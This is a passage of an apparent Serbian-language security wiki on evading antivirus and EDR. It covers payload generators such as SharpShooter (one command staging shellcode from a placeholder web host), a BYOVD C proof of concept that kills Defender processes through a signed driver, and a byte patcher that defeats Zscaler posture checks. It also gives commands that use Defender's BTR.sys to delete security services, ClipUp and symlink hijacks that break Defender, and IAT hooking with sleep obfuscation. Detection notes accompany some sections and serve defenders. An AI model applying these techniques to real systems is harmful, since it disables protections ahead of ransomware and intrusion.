- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Primer korišćenja Pythona za izradu injectora:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Ostali alati

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Više

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Onemogućavanje AV/EDR-a iz kernel prostora

Storm-2603 je koristio mali konzolni alat poznat kao **Antivirus Terminator** da onemogući zaštitu krajnjih tačaka pre nego što instalira ransomware. Alat donosi **sopstveni ranjivi, ali *potpisani* driver** i zloupotrebljava ga za izvršavanje privilegovanih kernel operacija koje čak ni AV servisi zaštićeni pomoću Protected-Process-Light (PPL) ne mogu da blokiraju.<sup>[[12]](#references)</sup>

Ključne napomene
1. **Potpisani driver**: Datoteka koja se isporučuje na disk je `ServiceMouse.sys`, ali binarna datoteka je legitimno potpisani driver `AToolsKrnl64.sys` iz „System In-Depth Analysis Toolkit“ kompanije Antiy Labs. Pošto driver ima važeći Microsoft potpis, učitava se čak i kada je omogućena opcija Driver-Signature-Enforcement (DSE).
2. **Instalacija servisa**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Prva linija registruje drajver kao **kernel servis**, a druga ga pokreće kako bi `\\.\ServiceMouse` postao dostupan iz korisničkog prostora.
3. **IOCTL-ovi koje izlaže drajver**
   | IOCTL kod | Mogućnost                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Prekinuti proizvoljan proces pomoću PID-a (koristi se za gašenje Defender/EDR servisa) |
   | `0x990000D0` | Obrisati proizvoljnu datoteku sa diska |
   | `0x990001D0` | Ukloniti drajver i servis |

   Minimalni C proof-of-concept:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Zašto funkcioniše**: BYOVD u potpunosti zaobilazi zaštite u korisničkom režimu; kod koji se izvršava u kernelu može da otvori *zaštićene* procese, da ih prekine ili da menja kernel objekte, bez obzira na PPL/PP, ELAM ili druge funkcije za ojačavanje bezbednosti.

Detekcija / ublažavanje
•  Omogućite Microsoftovu listu blokiranih ranjivih drajvera (`HVCI`, `Smart App Control`) kako bi Windows odbio učitavanje datoteke `AToolsKrnl64.sys`.
•  Pratite kreiranje novih *kernel* servisa i generišite upozorenje kada se drajver učita iz direktorijuma u koji svi mogu da upisuju ili nije na listi dozvoljenih.
•  Pratite korisničke procese koji otvaraju ručke ka prilagođenim objekatima uređaja, a zatim upućuju sumnjive pozive `DeviceIoControl`.

### Zaobilaženje Zscaler Client Connector provera stanja uređaja izmenom binarnih datoteka na disku

Zscaler **Client Connector** lokalno primenjuje pravila o stanju uređaja i oslanja se na Windows RPC za prosleđivanje rezultata drugim komponentama. Dva slaba izbora u dizajnu omogućavaju potpuno zaobilaženje:

1. Provera stanja uređaja se obavlja **u potpunosti na strani klijenta** (serveru se šalje logička vrednost).
2. Interni RPC endpointi proveravaju samo da li je izvršna datoteka koja se povezuje **potpisana od strane Zscaler-a** (putem `WinVerifyTrust`).<sup>[[11]](#references)</sup>

**Izmenom četiri potpisane binarne datoteke na disku** oba mehanizma mogu da se neutrališu:

| Binarna datoteka | Izmenjena originalna logika | Rezultat |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Uvek vraća `1`, pa svaka provera prolazi |
| `ZSAService.exe` | Indirektni poziv funkcije `WinVerifyTrust` | Zamenjen instrukcijama NOP ⇒ svaki proces (čak i nepotpisan) može da se poveže na RPC cevi |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Zamenjeno sa `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Provere integriteta tunela | Zaobiđene |

Minimalni isečak patcher-a:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Nakon zamene originalnih datoteka i ponovnog pokretanja servisnog steka:

* **Sve** provere stanja prikazuju zeleno/usaglašeno.
* Nepotpisani ili izmenjeni binarni fajlovi mogu da otvore RPC krajnje tačke imenovanih cevi (npr. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Kompromitovani host dobija neograničen pristup internoj mreži definisanoj Zscaler pravilima.

Ova studija slučaja pokazuje kako se odluke o poverenju koje se donose isključivo na strani klijenta i jednostavne provere potpisa mogu zaobići uz nekoliko izmena bajtova.

## Zloupotreba pouzdanih funkcionalnosti Microsoft Defender-a `BTR.sys`

Defender-ov drajver **Boot-Time Removal** koristan je primer suprotan klasičnom BYOVD-u. `BTR.sys` je legitimna Microsoft-ova komponenta za otklanjanje pretnji, bez greške korupcije memorije i bez IOCTL interfejsa; nakon sticanja administratorskog pristupa i privilegije `SeLoadDriverPrivilege`, operater umesto toga može da falsifikuje njegovu privatnu transakciju za otklanjanje pretnji i izvrši predviđene operacije nad datotekama/registrom u Ring-0 režimu. Ovo je **primitiva za neutralisanje AV/EDR-a nakon kompromitovanja, a ne za početni pristup ili eskalaciju privilegija**, a drajver se može izdvojiti iz resursa `BOOTTIMETOOL` u sopstvenom `MpEngine.dll` fajlu mete, umesto uvoza upadljivog drajvera treće strane.<sup>[[36]](#references)</sup>

### Priprema jednokratnog drajvera

Defender obično zapisuje resurs kao datoteku nasumičnog naziva `[a-z]{8}.sys` i registruje kernel servis sličnog naziva. `DriverEntry` čita vrednost `Args` servisa, otvara navedeni NTFS ADS, dešifruje i proverava listu akcija, zapisuje povratne informacije i nakon uspešnog izvršavanja vraća `0xC0000056` (`STATUS_DELETE_PENDING`), čime se drajver učitava umesto da ostane rezidentan. Falsifikovani servis ima sledeće karakteristične vrednosti.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Tok `:changelist` sadrži jedan RC4-šifrovan blob. Analizirane verzije ponovo koriste fiksni ključ od 256 bajtova, pa šifrovanje nije granica za autorizaciju. Ispravan otvoreni tekst ima globalno zaglavlje od 24 bajta (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC zaglavlja i ID transakcije izveden iz sadržaja), zatim putanju do povratne informacije u UTF-16 formatu, završenu nulom, i proizvoljan broj stavki. Svaka stavka ima zaglavlje od 16 bajtova (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`), a zatim podatke specifične za radnju koji se završavaju sa **tačno četiri NUL bajta**. Svako zaglavlje i svaki region podataka zasebno se proveravaju pomoću CRC-32 polinoma `0xEDB88320`, početnog stanja `0xFFFFFFFF` i **bez završnog XOR-a** (`~CRC32`); stanje CRC-a se resetuje za svaki region.<sup>[[36]](#references)[[37]](#references)</sup>

Prihvaćeni ID-jevi radnji otkrivaju sledeće primitive jezgra.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Podaci stavke | Rezultat |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Brisanje datoteke, uključujući zaključanu datoteku |
| 2 | `[UTF-16 path]` | Uklanjanje praznog direktorijuma |
| 3 | `[Flags][source][destination]` | Premeštanje datoteke na zaštićenu putanju koju je izabrao napadač; prazno odredište znači brisanje |
| 4 | `[Flags][key path]` | Rekurzivno brisanje registry ključa |
| 5 | `[Flags][key path + "\\" + value]` | Brisanje registry vrednosti |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Kreiranje/ažuriranje registry vrednosti i kreiranje putanja do nedostajućih ključeva |

Kod radnji 5 i 6, separator ključa/vrednosti u podacima na žici čine **dve uzastopne obrnute kose crte**; putanja formatirana na uobičajen način neće biti pravilno razdvojena. Datoteka za povratnu informaciju uglavnom odražava zahtev, ali prva četiri bajta podataka svake stavke postaju njen rezultat `NTSTATUS`. Kod radnji 1 i 2, koje nemaju početno polje zastavica, BTR premešta putanju u četiri rezervisana završna bajta da bi napravio mesta za taj status.<sup>[[36]](#references)</sup>

### Tok rada `BTR_CLI` i prozor ranog pokretanja

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) implementira ceo lanac: izdvaja `BTR.sys` iz lokalnog Defendera, kreira `<random>.sys:changelist` i tok za povratnu informaciju, serijalizuje/izračunava kontrolne sume/šifruje ulančane radnje, direktno kreira service registry ključ, a zatim poziva `NtLoadDriver` za `-trigger now` ili ga ostavlja kao drajver koji se pokreće pri pokretanju sistema za `-trigger boot`. Direktno postavljanje u registry zaobilazi uobičajeni SCM `CreateServiceW` put i zato **ne generiše** događaj instalacije servisa Event ID 7045. Artefakti pokrenuti pri pokretanju sistema mogu se naknadno ukloniti pomoću `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` nije upotrebljiv jer BTR obavlja file I/O iz `DriverEntry` pre nego što storage stack i veza `SystemRoot` budu spremni. `Start=1` uz grupu visokog prioriteta `Boot Bus Extender` izvršava se u Phase 1: NTFS je upotrebljiv, ali se mnogi security driver-i koji se pokreću pri startu sistema i EDR servisi u user mode-u još nisu inicijalizovali. Boot-start filteri kao što je `WdFilter` možda su već učitani, ali BTR može da ukloni njihove binarne datoteke ili konfiguraciju servisa pre sledećeg pokretanja, kao i da obriše izvršne datoteke servisa pre nego što ih SCM pokrene. ELAM ne zatvara ovaj jaz jer se BTR pokreće nakon procene boot-start stavki i ima važeći Microsoft potpis.<sup>[[36]](#references)</sup>

Više radnji izvršava se u jednoj transakciji. PoC dodaje Action 1 na početak za fiksno zadatu putanju `\SystemRoot\Temp\BootClean.log`: BTR kreira ovaj log, a zatim izvršava sopstveni zahtev za brisanje i uklanja ga pre isključivanja. Time se smanjuje količina dokaza, dok smeštanje povratnih informacija u `<random>.sys:<random>.dat` omogućava uklanjanje driver-a i oba stream-a zajedno.<sup>[[36]](#references)[[37]](#references)</sup>

### Korelacije za detekciju sa visokim signalom

Pravila zasnovana samo na potpisima i Microsoft lista blokiranih ranjivih driver-a ne rešavaju zloupotrebu predviđene BTR funkcionalnosti. Prednost dajte ovim korelacijama ponašanja, uz razlikovanje legitimnog Defender porekla od proizvoljnog pokretača.<sup>[[36]](#references)</sup>

- **Sysmon 15:** kreiranje `.sys:changelist` univerzalno je za BTR pripremu. ADS `.dat` prikačen za isti `.sys` posebno je sumnjiv jer legitimni Defender povratne informacije obično smešta u `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 bez System 7045:** korelišite direktno kreiranje `HKLM\SYSTEM\CurrentControlSet\Services\<random>` koje sadrži `Args=...:changelist` i `Group=Boot Bus Extender`, a nema odgovarajući SCM instalacioni događaj.
- **Sysmon 6 -> 23:** korelišite učitavanje poznatog BTR driver-a koji nije pokrenut kroz Defender, sa naknadnim brisanjem datoteke koje se pripisuje procesu `System`/PID 4, naročito kada je reč o security binarnim datotekama.
- **Sysmon 11 -> 23:** upozoravajte na brzo kreiranje i brisanje datoteke `\SystemRoot\Temp\BootClean.log` od strane procesa `System`/PID 4.
- Ograničite i nadgledajte dodeljivanje/omogućavanje privilegije `SeLoadDriverPrivilege`; sam Microsoft potpis nije dovoljan razlog za poverenje kada `cmd.exe`, PowerShell ili nepoznat proces priprema driver security alata.

## Zloupotreba Protected Process Light (PPL) za neovlašćeno menjanje AV/EDR-a pomoću LOLBIN-ova

Protected Process Light (PPL) sprovodi hijerarhiju potpisnika/nivoa tako da samo zaštićeni procesi istog ili višeg nivoa mogu da neovlašćeno menjaju jedni druge. Iz ofanzivne perspektive, ako možete legitimno da pokrenete binarnu datoteku sa omogućenim PPL-om i kontrolišete njene argumente, možete da pretvorite benignu funkcionalnost (npr. logovanje) u ograničeni mehanizam za upis, zaštićen PPL-om, u zaštićene direktorijume koje koriste AV/EDR alati.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Šta je potrebno da bi se proces pokrenuo kao PPL
- Ciljni EXE (i sve učitane DLL datoteke) moraju biti potpisani EKU-om koji podržava PPL.
- Proces mora biti kreiran pomoću CreateProcess sa zastavicama: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Mora se zatražiti kompatibilan nivo zaštite koji odgovara potpisniku binarne datoteke (npr. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` za potpisnike anti-malware alata, `PROTECTION_LEVEL_WINDOWS` za Windows potpisnike). Pogrešni nivoi dovešće do neuspeha pri kreiranju.

Ovde pogledajte i širi uvod u PP/PPL i zaštitu LSASS-a:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Alati za pokretanje
- Pomoćni alat otvorenog koda: CreateProcessAsPPL (bira nivo zaštite i prosleđuje argumente ciljnom EXE-u):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Obrazac upotrebe:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitiv: ClipUp.exe
- Potpisani sistemski binarni fajl `C:\Windows\System32\ClipUp.exe` pokreće sam sebe i prihvata parametar za upisivanje log fajla na putanju koju navede pozivalac.
- Kada se pokrene kao PPL proces, upisivanje fajla se obavlja uz PPL zaštitu.
- ClipUp ne može da obradi putanje koje sadrže razmake; koristite kratke 8.3 putanje za pristup uobičajeno zaštićenim lokacijama.

Pomoćni alati za kratke 8.3 putanje
- Prikaz kratkih imena: `dir /x` u svakom nadređenom direktorijumu.
- Izvođenje kratke putanje u cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Lanac zloupotrebe (apstraktno)
1) Pokrenite PPL-sposobni LOLBIN (ClipUp) sa `CREATE_PROTECTED_PROCESS` pomoću pokretača (npr. CreateProcessAsPPL).
2) Prosledite ClipUp argument za putanju log fajla da biste primorali kreiranje fajla u zaštićenom AV direktorijumu (npr. Defender Platform). Po potrebi koristite kratka 8.3 imena.
3) Ako je ciljna binarna datoteka obično otvorena/zaključana dok AV radi (npr. MsMpEng.exe), zakažite upisivanje pri pokretanju sistema, pre nego što se AV pokrene, tako što ćete instalirati uslugu za automatsko pokretanje koja se pouzdano pokreće ranije. Proverite redosled pokretanja pomoću Process Monitor-a (evidentiranje pokretanja sistema).
4) Pri ponovnom pokretanju sistema, upisivanje uz PPL zaštitu obavlja se pre nego što AV zaključa svoje binarne datoteke, čime se oštećuje ciljna datoteka i sprečava njeno pokretanje.

Primer poziva (putanje su izostavljene/skraćene radi bezbednosti):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Napomene i ograničenja
- Ne možete da kontrolišete sadržaj koji ClipUp upisuje, osim mesta upisa; ova primitiva je pogodna za korupciju, a ne za precizno ubacivanje sadržaja.
- Potrebna su lokalna administratorska/SYSTEM prava za instaliranje/pokretanje usluge i vremenski prozor za ponovno pokretanje.
- Tajming je kritičan: ciljna datoteka ne sme biti otvorena; izvršavanje pri pokretanju izbegava zaključavanje datoteke.

Detekcije
- Kreiranje procesa `ClipUp.exe` sa neuobičajenim argumentima, naročito ako ga pokreću nestandardni pokretači, u periodu oko pokretanja sistema.
- Nove usluge podešene za automatsko pokretanje sumnjivih binarnih datoteka i njihovo dosledno pokretanje pre Defendera/AV-a. Istražite kreiranje/izmenu usluga pre neuspeha pri pokretanju Defendera.
- Praćenje integriteta datoteka Defendera/direktorijuma Platform; neočekivano kreiranje/izmena datoteka od strane procesa sa zastavicama zaštićenog procesa.
- ETW/EDR telemetrija: tražite procese kreirane sa `CREATE_PROTECTED_PROCESS` i anomalnu upotrebu PPL nivoa od strane binarnih datoteka koje nisu AV.

Mere ublažavanja
- WDAC/Code Integrity: ograničite koje potpisane binarne datoteke mogu da se pokreću kao PPL i pod kojim nadređenim procesima; blokirajte pokretanje ClipUp-a izvan legitimnog konteksta.
- Higijena usluga: ograničite kreiranje/izmenu usluga koje se automatski pokreću i nadgledajte manipulisanje redosledom pokretanja.
- Proverite da li su omogućeni Defender tamper protection i zaštite pri ranom pokretanju; istražite greške pri pokretanju koje ukazuju na oštećenje binarnih datoteka.
- Razmotrite onemogućavanje generisanja kratkih 8.3 imena na volumenima na kojima se nalaze bezbednosni alati, ako je to kompatibilno sa vašim okruženjem (pažljivo testirajte).

## Manipulisanje Microsoft Defenderom putem otmice symlink-a fascikle Platform Version

Windows Defender bira platformu sa koje se pokreće tako što nabraja podfascikle u:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Bira podfasciklu sa najvišim leksikografskim nizom verzije (npr. `4.18.25070.5-0`), a zatim odatle pokreće procese usluge Defender (uz odgovarajuće ažuriranje putanja usluge/registra). Ovaj izbor uzima u obzir unose direktorijuma, uključujući reparse points direktorijuma (symlink-ove). Administrator to može da iskoristi za preusmeravanje Defendera na putanju u koju napadač može da upisuje i da postigne DLL sideloading ili ometanje usluge.<sup>[[21]](#references)[[22]](#references)</sup>

Preduslovi
- Lokalna administratorska prava (potrebna za kreiranje direktorijuma/symlink-ova u fascikli Platform)
- Mogućnost ponovnog pokretanja sistema ili pokretanja ponovnog izbora platforme Defendera (ponovno pokretanje usluge pri pokretanju sistema)
- Potrebni su samo ugrađeni alati (`mklink`)

Zašto funkcioniše
- Defender blokira upisivanje u sopstvene fascikle, ali pri izboru platforme veruje unosima direktorijuma i bira leksikografski najvišu verziju, ne proveravajući da li se cilj razrešava na zaštićenu/poverljivu putanju.

Korak po korak (primer)
1) Pripremite kopiju trenutne fascikle platforme u koju se može upisivati, npr. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Napravite symlink direktorijuma sa višom verzijom unutar direktorijuma Platform koji pokazuje na vašu fasciklu:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Izbor okidača (preporučuje se ponovno pokretanje):
```cmd
shutdown /r /t 0
```
4) Proverite da li se MsMpEng.exe (WinDefend) pokreće sa preusmerene putanje:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Trebalo bi da primetite novu putanju procesa u direktorijumu `C:\TMP\AV\` i da konfiguracija servisa/registar odražavaju tu lokaciju.

Opcije nakon eksploatacije
- DLL sideloading/izvršavanje koda: Odbacite/zamenite DLL-ove koje Defender učitava iz direktorijuma svoje aplikacije da biste izvršili kod u Defenderovim procesima. Pogledajte gornji odeljak: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Zaustavljanje servisa/uskraćivanje usluge: Uklonite simboličku vezu verzije kako se pri sledećem pokretanju konfigurisana putanja ne bi razrešila i kako Defender ne bi uspeo da se pokrene:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Imajte na umu da ova tehnika sama po sebi ne omogućava eskalaciju privilegija; potrebna su administratorska prava.

## API/IAT Hooking + Call-Stack Spoofing sa PIC-om (u stilu Crystal Kit-a)

Red timovi mogu da premeste runtime evasion iz C2 implant-a u sam ciljni modul tako što će hook-ovati njegovu Import Address Table (IAT) i preusmeriti odabrane API-je kroz position-independent code (PIC) koji kontroliše napadač. Time se evasion proširuje izvan malog skupa API-ja koje mnogi alati izlažu (npr. CreateProcessA), a iste zaštite se primenjuju i na BOF-ove i post-exploitation DLL-ove.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Pristup na visokom nivou
- Postavite PIC blob uz ciljni modul pomoću reflective loader-a (na početku ili kao prateću datoteku). PIC mora biti samostalan i position-independent.
- Kada se host DLL učita, prođite kroz njegov IMAGE_IMPORT_DESCRIPTOR i zakrpite IAT unose za ciljane importe (npr. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) tako da pokazuju na tanke PIC wrapper-e.
- Svaki PIC wrapper izvršava evasion tehnike pre nego što prosledi poziv stvarnoj API adresi. Tipične evasion tehnike uključuju:
  - Maskiranje/odmaskiranje memorije oko poziva (npr. šifrovanje beacon region-a, RWX→RX, menjanje naziva/ovlašćenja stranica), a zatim vraćanje stanja nakon poziva.
  - Call-stack spoofing: napravite bezopasan stack i pređite na ciljni API tako da analiza call stack-a utvrdi očekivane frejmove.<sup>[[9]](#references)</sup>
- Radi kompatibilnosti, izvezite interfejs kako bi Aggressor skripta (ili ekvivalent) mogla da registruje API-je koje treba hook-ovati za Beacon, BOF-ove i post-ex DLL-ove.

Zašto ovde koristiti IAT hooking
- Radi za svaki kod koji koristi hook-ovani import, bez menjanja koda alata i bez oslanjanja na Beacon da posreduje pri pozivima određenih API-ja.
- Pokriva post-ex DLL-ove: hook-ovanje LoadLibrary* omogućava presretanje učitavanja modula (npr. System.Management.Automation.dll, clr.dll) i primenu istog maskiranja/izbegavanja analize stack-a na njihove API pozive.
- Vraća pouzdanu upotrebu post-ex komandi koje pokreću procese uprkos detekcijama zasnovanim na call stack-u, tako što obavija CreateProcessA/W.

Minimalna skica IAT hook-a (x64 C/C++ pseudokod)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Napomene
- Primeni patch nakon relocations/ASLR, a pre prve upotrebe importa. Reflective loader-i kao što su TitanLdr/AceLdr prikazuju hooking tokom DllMain-a učitanog modula.
- Wrappere drži malim i PIC-safe; pravu API funkciju pronađi preko originalne IAT vrednosti koju si sačuvao pre patchovanja ili preko LdrGetProcedureAddress.
- Za PIC koristi RW → RX prelaze i izbegavaj da ostavljaš stranice koje su istovremeno writable+executable.

Stub za Call-stack spoofing
- PIC stubovi u Draugr stilu prave lažni call chain (povratne adrese u benignim modulima), a zatim preusmeravaju izvršavanje na pravu API funkciju.
- Time se zaobilaze detekcije koje očekuju kanonske call stack-ove od Beacon/BOF-ova do osetljivih API funkcija.
- Kombinuj sa tehnikama stack cutting/stack stitching da bi se izvršavanje smestilo unutar očekivanih frejmova pre prologa API funkcije.

Operativna integracija
- Dodaj reflective loader ispred post-ex DLL-ova kako bi se PIC i hook-ovi automatski inicijalizovali pri učitavanju DLL-a.
- Koristi Aggressor skriptu za registraciju ciljnih API funkcija kako bi Beacon i BOF-ovi transparentno koristili isti evasion put bez izmena koda.

Razmatranja za detekciju/DFIR
- IAT integritet: unosi koji vode do adresa koje nisu u image-u (heap/anon); periodična provera import pointer-a.
- Anomalije stack-a: povratne adrese koje ne pripadaju učitanim image-ovima; nagli prelazi na PIC koji nije u image-u; nedosledno poreklo od RtlUserThreadStart.
- Telemetrija loader-a: upisivanja u IAT unutar procesa, rana aktivnost u DllMain-у koja menja import thunk-ове, neočekivana RX područja kreirana pri učitavanju.
- Zaobilaženje image-load detekcije: ako hook-uješ LoadLibrary*, prati sumnjiva učitavanja automation/clr assembly-ја povezana sa događajima maskiranja memorije.

Povezani gradivni elementi i primeri
- Reflective loader-и koji obavljaju IAT patching tokom učitavanja (npr. TitanLdr, AceLdr)
- Memory masking hook-ovi (npr. simplehook) i stack-cutting PIC (stackcutting)
- PIC stub-ovi za Call-stack spoofing (npr. Draugr)


## IAT Hooking pri uvozu + Sleep Obfuscation (Crystal Palace/PICO)

### IAT hook-ovi pri uvozu preko rezidentnog PICO-a

Ako kontrolišeš reflective loader, možeš da hook-uješ importe **tokom** `ProcessImports()` tako što ćeš pokazivač loader-a na `GetProcAddress` zameniti prilagođenim resolver-om koji prvo proverava hook-ove:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Napravi **rezidentni PICO** (persistent PIC objekat) koji opstaje nakon što se privremeni loader PIC oslobodi.
- Izvezi funkciju `setup_hooks()` koja prepisuje resolver importa loader-a (npr. `funcs.GetProcAddress = _GetProcAddress`).
- U `_GetProcAddress` preskoči ordinal importe i koristi pretragu hook-ova zasnovanu na hash-u, kao što je `__resolve_hook(ror13hash(name))`. Ako hook postoji, vrati ga; u suprotnom pozovi pravi `GetProcAddress`.
- Registruj ciljeve hook-ova u vreme linkovanja pomoću Crystal Palace unosa `addhook "MODULE$Func" "hook"`. Hook ostaje važeći jer se nalazi unutar rezidentnog PICO-a.

Tako se postiže **IAT redirekcija pri uvozu** bez patchovanja code sekcije učitanog DLL-a nakon učitavanja.

### Prinudno dodavanje hookable importa kada cilj koristi PEB-walking

Hook-ovi pri uvozu se aktiviraju samo ako se funkcija zaista nalazi u IAT-u cilja. Ako modul razrešava API funkcije preko PEB-walk + hash-a (bez import unosa), nateraj ga da napravi pravi import kako bi putanja `ProcessImports()` u loader-u mogla da ga obradi:

- Zameni razrešavanje izvezenih funkcija preko hash-a (npr. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) direktnom referencom kao što je `&WaitForSingleObject`.
- Kompajler će emitovati IAT unos, čime se omogućava presretanje dok reflective loader razrešava importe.

### Sleep/idle obfuskacija u Ekko stilu bez patchovanja `Sleep()`

Umesto patchovanja `Sleep`, hook-uj **stvarne wait/IPC primitive** koje implant koristi (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Kod dugih čekanja, obuhvati poziv Ekko-style obfuscation chain-om koji šifruje image u memoriji tokom neaktivnosti:<sup>[[31]](#references)[[27]](#references)</sup>

- Koristi `CreateTimerQueueTimer` da zakažeš niz callback-ова koji pozivaju `NtContinue` sa pripremljenim `CONTEXT` frejmovima.
- Tipičan chain (x64): postavi image na `PAGE_READWRITE` → šifruj RC4 algoritmom preko `advapi32!SystemFunction032` ceo mapirani image → izvrši blokirajuće čekanje → dešifruj RC4 algoritmom → **vrati dozvole po sekcijama** obilaskom PE sekcija → signalizuj završetak.
- `RtlCaptureContext` daje šablon `CONTEXT`; kloniraj ga u više frejmova i postavi registre (`Rip/Rcx/Rdx/R8/R9`) da bi se izvršio svaki korak.

Operativni detalj: vrati „success“ za duga čekanja (npr. `WAIT_OBJECT_0`) kako bi pozivalac nastavio dok je image maskiran. Ovaj obrazac skriva modul od skenera tokom perioda neaktivnosti i izbegava prepoznatljiv potpis klasičnog „patchovanog `Sleep()`“.

Ideje za detekciju (zasnovane na telemetriji)
- Naleti `CreateTimerQueueTimer` callback-ова koji pokazuju na `NtContinue`.
- Upotreba `advapi32!SystemFunction032` nad velikim, neprekinutim baferima veličine image-а.
- `VirtualProtect` nad velikim opsegom, nakon čega sledi prilagođeno vraćanje dozvola po sekcijama.

### Runtime CFG registracija za sleep-obfuscation gadget-e

Na CFG-om omogućenim ciljevima, prvi indirektni skok u gadget usred funkcije, kao što je `jmp [rbx]` ili `jmp rdi`, obično će srušiti proces sa `STATUS_STACK_BUFFER_OVERRUN` jer gadget nije prisutan u CFG metapodacima modula. Da bi Ekko/Kraken-style chain-ovi radili unutar ojačanih procesa:<sup>[[30]](#references)</sup>

- Registruj svako indirektno odredište koje koristi chain pomoću `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` i unosa `CFG_CALL_TARGET_VALID`.
- Za adrese unutar učitanih image-ova (`ntdll`, `kernel32`, `advapi32`), `MEMORY_RANGE_ENTRY` mora da počinje na **osnovnoj adresi image-а** i da obuhvati **celu veličinu image-а**.
